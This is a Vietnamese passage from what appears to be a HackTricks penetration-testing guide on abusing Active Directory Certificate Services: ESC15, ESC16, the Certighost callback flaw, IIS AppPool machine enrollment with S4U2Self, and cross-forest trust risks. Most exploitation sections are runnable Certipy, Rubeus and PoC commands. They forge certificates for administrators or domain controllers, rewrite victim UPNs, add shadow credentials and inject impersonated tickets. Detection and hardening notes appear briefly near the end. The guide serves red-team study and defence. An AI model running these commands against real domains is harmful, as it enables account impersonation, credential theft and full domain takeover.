Nghiên cứu [ESC15 ban đầu](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) giải thích cách application policy được cung cấp trong yêu cầu cho một V1 template có thể ghi đè Extended Key Usage đã cấu hình trên **issuing CA chưa được vá**.<sup>[[15]](#references)</sup> Đối tượng cũng cần một template đã được publish và cho phép enroll, đồng thời đáp ứng các thuộc tính subject/request cần thiết và không bị chặn bởi bước phê duyệt hoặc yêu cầu chữ ký. Chỉ có quyền enroll không chứng minh được khả năng khai thác. Việc sử dụng Certificate Request Agent còn có thể phụ thuộc vào một template thứ hai phù hợp và các hạn chế dành cho enrollment agent; hãy xác nhận trạng thái vá của CA và kết quả cấp chứng chỉ trước khi khẳng định có thể khai thác theo hướng này.

### Lạm dụng

Tài liệu hướng dẫn leo thang đặc quyền của [Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) có các ví dụ sử dụng chi tiết hơn.<sup>[[14]](#references)</sup>


Lệnh `find` của Certipy có thể giúp xác định các V1 template có khả năng bị ảnh hưởng bởi ESC15 nếu CA chưa được vá.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenario A: Mạo danh trực tiếp qua Schannel

**Bước 1: Yêu cầu certificate, chèn Application Policy "Client Authentication" và UPN của mục tiêu.** Kẻ tấn công `attacker@corp.local` nhắm đến `administrator@corp.local` bằng template V1 "WebServer" (cho phép người đăng ký tự cung cấp subject).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Mẫu V1 dễ bị tấn công với tùy chọn "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Chèn OID `1.3.6.1.5.5.7.3.2` vào extension Application Policies của CSR.
- `-upn 'administrator@corp.local'`: Đặt UPN trong SAN để giả mạo danh tính.

**Bước 2: Xác thực qua Schannel (LDAPS) bằng chứng chỉ đã lấy được.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Bước 1: Yêu cầu certificate từ template V1 (có thuộc tính "Enrollee supplies subject"), chèn Application Policy "Certificate Request Agent".** Certificate này dành cho attacker (`attacker@corp.local`) để trở thành enrollment agent. Không chỉ định UPN cho danh tính của attacker ở đây, vì mục tiêu là có được quyền năng của agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Inject OID `1.3.6.1.4.1.311.20.2.1`.

**Bước 2: Sử dụng certificate "agent" để yêu cầu một certificate thay mặt cho một người dùng đặc quyền mục tiêu.** Đây là bước tương tự ESC3, sử dụng certificate từ Bước 1 làm certificate agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Bước 3: Xác thực với tư cách người dùng có đặc quyền bằng chứng chỉ "on-behalf-of".**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Vô hiệu hóa Security Extension trên CA (toàn cục)-ESC16

### Giải thích

**ESC16 (Nâng cao đặc quyền do thiếu phần mở rộng szOID_NTDS_CA_SECURITY_EXT)** mô tả việc vô hiệu hóa phần mở rộng SID **szOID_NTDS_CA_SECURITY_EXT** trên toàn CA. Đây là dấu hiệu cấu hình, không phải bằng chứng rằng chứng chỉ có thể xác thực dưới danh nghĩa một tài khoản khác. Việc mạo danh còn đòi hỏi quyền kiểm soát các thuộc tính hoặc cơ chế ánh xạ của tài khoản liên quan, một template xác thực máy khách cho phép đăng ký và một đường dẫn ánh xạ chứng chỉ được bộ điều khiển miền hoặc dịch vụ thực tế chấp nhận. KDC đã được vá ở chế độ Full Enforcement sẽ từ chối chứng chỉ không có phần mở rộng SID, trừ khi chứng chỉ có một ánh xạ mạnh khác; quy trình Kerberos chỉ dùng UPN bên dưới áp dụng cho các KDC cũ hơn hoặc chạy ở chế độ tương thích vẫn chấp nhận ánh xạ yếu. Xem [Microsoft's certificate mapping and enforcement guidance](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Bạn cũng có thể tham khảo bài viết này để tìm hiểu thêm về nguyên lý chi tiết:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Lạm dụng

Ví dụ Kerberos lịch sử chỉ dùng UPN dưới đây dựa trên [Certipy's ESC16 documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Ví dụ này yêu cầu KDC vẫn chấp nhận ánh xạ yếu được tạo ra; `StrongCertificateBindingEnforcement=1` không còn là tùy chọn ghi đè được hỗ trợ sau bản cập nhật bảo mật Windows ngày 9 tháng 9 năm 2025.<sup>[[14]](#references)</sup>

Để xác định liệu môi trường Active Directory Certificate Services (AD CS) có dễ bị tấn công bằng **ESC16** hay không.

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Bước 1: Đọc UPN ban đầu của tài khoản nạn nhân (Tùy chọn - để khôi phục).  **  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Bước 2: Cập nhật UPN của tài khoản nạn nhân thành `sAMAccountName` của quản trị viên mục tiêu.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Bước 3: (Nếu cần) Lấy thông tin xác thực của tài khoản "nạn nhân" (ví dụ: qua Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Bước 4: Yêu cầu chứng chỉ với tư cách người dùng "victim" từ một template xác thực client mà tài khoản có thể đăng ký (ví dụ: "User") trên CA được cấu hình ESC16.** CA bỏ qua phần mở rộng bảo mật SID trong chứng chỉ được cấp, nhưng chỉ điều này không tạo ra ánh xạ xác thực có thể sử dụng. Đặt biến môi trường Kerberos credential cache (lệnh shell):

```bash
export KRB5CCNAME=victim.ccache
```

Sau đó yêu cầu chứng chỉ:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Bước 5: Hoàn nguyên UPN của tài khoản "nạn nhân".**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Bước 6: Trên KDC cũ hơn hoặc ở chế độ tương thích chấp nhận ánh xạ yếu này, hãy xác thực với tư cách quản trị viên mục tiêu.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Giả mạo danh tính qua callback chase của Rogue LDAP/LSA (Certighost / CVE-2026-54121)

### Giải thích

**Certighost** khai thác **đường dẫn enrollment chase / callback của AD CS**, trong đó CA tin cậy các thuộc tính request do requester cung cấp để xác định danh tính sẽ được đưa vào certificate đã cấp. Trong PoC công khai, request được tạo thủ công bao gồm:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP do attacker kiểm soát mà CA sẽ kết nối
- **`rmd`**: **tên DNS của Domain Controller mục tiêu** cần giả mạo

Nếu CA thực hiện chase đó, CA sẽ kết nối đến attacker qua **SMB/LSA (`445`)** và **LDAP (`389`)**. Attacker dùng một **tài khoản máy thực** (thường được tạo thông qua **`ms-DS-MachineAccountQuota`** mặc định) để phiên callback xác thực bằng một principal hợp lệ trong domain, nhưng các dịch vụ rogue trả về các thuộc tính danh tính của **DC mục tiêu**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Nếu CA **không ràng buộc bằng mật mã danh tính trả về với principal callback đã xác thực**, CA có thể cấp certificate cho **Domain Controller** dù phiên đó đã xác thực bằng tài khoản máy do attacker kiểm soát. Về mặt khái niệm, lỗi này khác với **Certifried**: thay vì ghi đè các thuộc tính AD như `dNSHostName`, attacker **thay thế dữ liệu danh tính trong quá trình phân giải callback của CA**.<sup>[[2]](#references)</sup>

**Điều kiện tiên quyết hữu ích:**

- **Thông tin xác thực domain** với quyền thấp
- Có thể **tạo hoặc tái sử dụng tài khoản máy tính**
- Có kết nối mạng từ **CA** đến các **cổng `389` và `445`** do attacker kiểm soát
- Đường dẫn xử lý request của CA dễ bị tấn công / chưa được vá (bản cập nhật Microsoft ngày **14 tháng 7, 2026** đã bổ sung **kiểm tra DC cho `cdc`** cùng với **so sánh SID đã phân giải**)

Sau đó có thể dùng **`.pfx`** thu được cho **PKINIT**, tạo ra **`.ccache`** và, theo luồng PoC đã công bố, **NT hash của DC mục tiêu**; thông tin này thường đủ để **chiếm quyền domain hoàn toàn**.

### Khai thác

PoC công khai tự động hóa toàn bộ chuỗi:<sup>[[1]](#references)</sup>

1. Tạo hoặc tái sử dụng **tài khoản máy** do attacker kiểm soát.
2. Khởi chạy các listener **LDAP và SMB/LSA rogue** trên cổng `389` và `445`.
3. Gửi certificate request chứa các thuộc tính **`cdc`** do attacker kiểm soát và **`rmd`** của mục tiêu.
4. Để CA xác thực với các listener rogue bằng tài khoản máy được kiểm soát, nhưng trả về các kết quả tra cứu danh tính chứa thuộc tính của **DC mục tiêu**.
5. Nhận **certificate DC** do CA ký, sau đó dùng nó cho **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Cờ runtime hữu ích từ PoC:

- `--listener <ip>`: chọn rõ ràng IP callback được quảng bá trong `cdc`
- `--computer-name <NAME$>`: dùng lại một machine account hiện có thay vì tạo tài khoản mới

**Lưu ý vận hành:**

- PoC cần **root** vì phải bind vào các **privileged port** `389` và `445`.
- Khai thác thành công sẽ ghi một **DC `.pfx`** và **Kerberos `.ccache`** vào máy cục bộ.
- Vì certificate ánh xạ tới một **Domain Controller account**, các hành động tiếp theo có thể bao gồm **certificate-based Kerberos auth**, **DCSync** và sử dụng lại **machine NT hash** đã khôi phục.<sup>[[2]](#references)</sup>

## Đăng ký máy IIS AppPool để đạt Administrator trên cùng host

Một IIS pool chạy dưới danh tính `ApplicationPoolIdentity` sử dụng **computer account** của host đó khi truy cập tài nguyên mạng từ bên ngoài. Vì vậy, thực thi mã với tư cách `IIS AppPool\<POOL>` vẫn có đặc quyền thấp trong local token, nhưng có thể gửi yêu cầu tới AD CS mà CA xác thực là `HOST$`; đây là quá trình chuyển đổi danh tính outbound, không phải token impersonation hay nâng quyền cục bộ kiểu Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Chuỗi này cần một IIS host đã tham gia domain, Enterprise CA có thể truy cập qua RPC, một machine-authentication template đã được publish và máy tính có quyền enrollment, hỗ trợ PKINIT, cùng khả năng kết nối tới KDC/SMB. Custom pool identity sẽ thay đổi principal outbound, vì vậy hãy xác nhận pool thực sự dùng `ApplicationPoolIdentity` trước khi mặc định rằng đó là `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrollment bằng key do attacker kiểm soát

Tạo cặp key và CSR bên ngoài IIS server, đồng thời giữ lại private key. Chỉ gửi **CSR** từ worker đã bị compromise. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) khởi tạo `CertificateAuthority.Request`, đặt `CertificateTemplate:Machine`, gọi `ICertRequest::Submit` và trả về certificate đã cấp. Dùng chuỗi cấu hình CA `CAHOST\CA-NAME`; một template `Machine` thông thường sẽ tạo subject từ AD, nên không cần dữ liệu subject/SAN do requester cung cấp.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Kết hợp certificate trả về với **key tương ứng đã giữ lại**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` chỉ hoạt động khi Windows đã có thể liên kết certificate với một private key có thể truy cập; với các file PEM riêng biệt, hãy tạo PKCS#12 theo cách tường minh:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Sử dụng PFX cho PKINIT và giữ TGT của máy tính được trả về ở dạng base64 thay vì inject ngay lập tức:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self cộng với thay thế dịch vụ trên cùng máy chủ

S4U2Self cho phép một dịch vụ lấy ticket **cho chính nó**, chứa dữ liệu ủy quyền của người dùng khác. Với TGT của máy tính, Rubeus có thể yêu cầu ticket đó cho một người dùng có đặc quyền, đổi tên dịch vụ trong KRB-CRED được trả về thành CIFS rồi inject ticket. Đây là primitive “ủy quyền cho chính mình” cục bộ: không cần S4U2Proxy hay mục `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Vé đã được thay thế chỉ có thể được các dịch vụ trên **cùng tài khoản/khóa máy tính** sử dụng (ở đây là CIFS trên `HOST`). Đây không phải là vé Administrator có thể tái sử dụng trên các máy khác trong domain. Ngoài ra, kết quả được minh họa là quyền truy cập SMB/hệ thống tệp với đặc quyền Administrator; để có được một tiến trình `NT AUTHORITY\SYSTEM` cục bộ, vẫn cần thực hiện thêm một bước thực thi từ xa riêng.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Phát hiện và tăng cường bảo mật

- Trên CA, đối chiếu các sự kiện Certification Services **4886** (đã nhận yêu cầu) và **4887** (đã cấp chứng chỉ) để phát hiện các yêu cầu bất thường sử dụng template `Machine` từ tài khoản máy chủ IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Trên DC, sự kiện **4768** bao gồm các trường chứng chỉ khi sử dụng xác thực trước bằng chứng chỉ; hãy cảnh báo về các yêu cầu TGT PKINIT bất thường từ tài khoản máy chủ web. Tiếp theo, kiểm tra các yêu cầu **4769** liên quan đến một danh tính đặc quyền bị mạo danh và cùng một máy chủ. Vì Rubeus `/altservice` ghi đè tên dịch vụ KRB-CRED ở phía client, không nên yêu cầu tên dịch vụ trong 4769 phía DC phải là `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Tìm kiếm hoạt động `w3wp.exe` kết nối đến các endpoint RPC của CA, tạo tệp ASPX bất thường, truy cập các share quản trị bằng Kerberos và dump secrets. Hạn chế quyền truy cập từ tầng ứng dụng đến CA RPC/KDC/SMB nếu có thể, đồng thời loại bỏ quyền đăng ký chứng chỉ của máy tính hoặc các template xác thực máy không cần thiết cho hoạt động.<sup>[[19]](#references)</sup>

## Giải thích việc xâm phạm forest bằng chứng chỉ ở thể bị động

### Phá vỡ trust giữa các forest bằng CA bị xâm phạm

Cấu hình **đăng ký chứng chỉ xuyên forest** được thực hiện tương đối đơn giản. Quản trị viên **công bố chứng chỉ CA gốc** từ resource forest **đến các account forest**, đồng thời các chứng chỉ **enterprise CA** từ resource forest được **thêm vào các container `NTAuthCertificates` và AIA trong mỗi account forest**. Nói cách khác, cách sắp xếp này trao cho **CA trong resource forest toàn quyền kiểm soát** mọi forest khác mà CA đó quản lý PKI. Nếu CA này bị **kẻ tấn công xâm phạm**, chúng có thể **giả mạo chứng chỉ cho tất cả người dùng trong cả resource forest lẫn account forest**, qua đó phá vỡ ranh giới bảo mật của forest.<sup>[[6]](#references)</sup>

### Cấp quyền đăng ký cho principal bên ngoài

Trong môi trường nhiều forest, cần thận trọng với các Enterprise CA **công bố certificate template** cho phép **Authenticated Users hoặc principal bên ngoài** (người dùng/nhóm nằm ngoài forest chứa Enterprise CA) **có quyền đăng ký và chỉnh sửa**.\
Khi xác thực qua một trust, AD thêm **SID của Authenticated Users** vào token của người dùng. Vì vậy, nếu một domain có Enterprise CA với template **cho phép Authenticated Users đăng ký**, người dùng từ một forest khác có thể đăng ký template đó. Tương tự, nếu template **cấp rõ quyền đăng ký cho một principal bên ngoài**, thì **mối quan hệ kiểm soát truy cập xuyên forest sẽ được tạo ra**, cho phép principal từ một forest **đăng ký template thuộc forest khác**.

Cả hai tình huống đều làm **tăng bề mặt tấn công** giữa các forest. Kẻ tấn công có thể khai thác các thiết lập của certificate template để giành thêm đặc quyền trong một domain bên ngoài.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 kho lưu trữ PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Phân tích kỹ thuật Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Lạm dụng Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, giao diện BloodHound, phương thức xác thực và yêu cầu mới cùng nhiều nội dung khác](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Lạm dụng ánh xạ tài khoản Key Trust để chiếm quyền tài khoản](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Câu chuyện về Enhanced Key Usage (sử dụng sai)](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relay đến AD Certificate Services qua RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Truy cập shell vào ADCS CA bằng YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Kỹ thuật lạm dụng ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Kỹ thuật lạm dụng ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Leo thang đặc quyền (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Không chỉ là một AD CS ESC khác](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Cấu hình sai và khai thác](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Xem xét lại “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC đăng ký IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Leo thang đặc quyền từ IIS AppPool qua endpoint RPC của AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Danh tính Application Pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – lệnh pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Kiểm tra Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Sự kiện 4768: Đã yêu cầu vé xác thực Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Sự kiện 4769: Đã yêu cầu vé dịch vụ Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – Bộ công cụ khai thác AD CS bằng PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
